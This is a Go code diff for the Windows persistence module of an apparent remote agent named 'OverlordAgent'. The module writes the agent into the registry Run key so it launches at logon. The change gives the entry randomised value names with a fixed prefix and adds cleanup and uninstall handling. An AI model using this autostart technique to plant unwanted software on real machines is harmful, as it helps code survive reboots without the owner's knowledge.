@@ -4,16 +4,20 @@
 package persistence
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"golang.org/x/sys/windows/registry"
 )
 
 const registryKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
-const registryValueName = "OverlordAgent"
+const legacyRegistryValueName = "OverlordAgent"
+const registryValuePrefix = "OverlordAgent-"
 
 func formatRunRegistryCommand(exePath string) string {
 	trimmed := filepath.Clean(exePath)
@@ -54,8 +58,7 @@ func install(exePath string) error {
 	}
 	defer k.Close()
 
-	err = k.SetStringValue(registryValueName, formatRunRegistryCommand(targetPath))
-	if err != nil {
+	if err := setStartupRunValue(k, targetPath); err != nil {
 		return fmt.Errorf("failed to set registry value: %w", err)
 	}
 
@@ -109,7 +112,7 @@ func configure(exePath string) error {
 	}
 	defer k.Close()
 
-	if err := k.SetStringValue(registryValueName, formatRunRegistryCommand(exePath)); err != nil {
+	if err := setStartupRunValue(k, exePath); err != nil {
 		return fmt.Errorf("failed to set registry value: %w", err)
 	}
 
@@ -124,9 +127,8 @@ func uninstall() error {
 	}
 	defer k.Close()
 
-	err = k.DeleteValue(registryValueName)
-	if err != nil && err != registry.ErrNotExist {
-		return fmt.Errorf("failed to delete registry value: %w", err)
+	if err := cleanupOverlordRunValues(k); err != nil {
+		return fmt.Errorf("failed to clean startup registry values: %w", err)
 	}
 
 	appDataDir := os.Getenv("APPDATA")
@@ -137,4 +139,49 @@ func uninstall() error {
 	}
 
 	return nil
+}
+
+func setStartupRunValue(k registry.Key, exePath string) error {
+	if err := cleanupOverlordRunValues(k); err != nil {
+		return err
+	}
+
+	name, err := generateStartupValueName()
+	if err != nil {
+		return err
+	}
+
+	return k.SetStringValue(name, formatRunRegistryCommand(exePath))
+}
+
+func cleanupOverlordRunValues(k registry.Key) error {
+	names, err := k.ReadValueNames(0)
+	if err != nil {
+		return err
+	}
+
+	for _, name := range names {
+		if isOverlordRunValueName(name) {
+			if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+
+func isOverlordRunValueName(name string) bool {
+	if strings.EqualFold(name, legacyRegistryValueName) {
+		return true
+	}
+	return strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix))
+}
+
+func generateStartupValueName() (string, error) {
+	b := make([]byte, 6)
+	if _, err := rand.Read(b); err != nil {
+		return "", fmt.Errorf("failed to generate startup value name: %w", err)
+	}
+	return registryValuePrefix + hex.EncodeToString(b), nil
 }
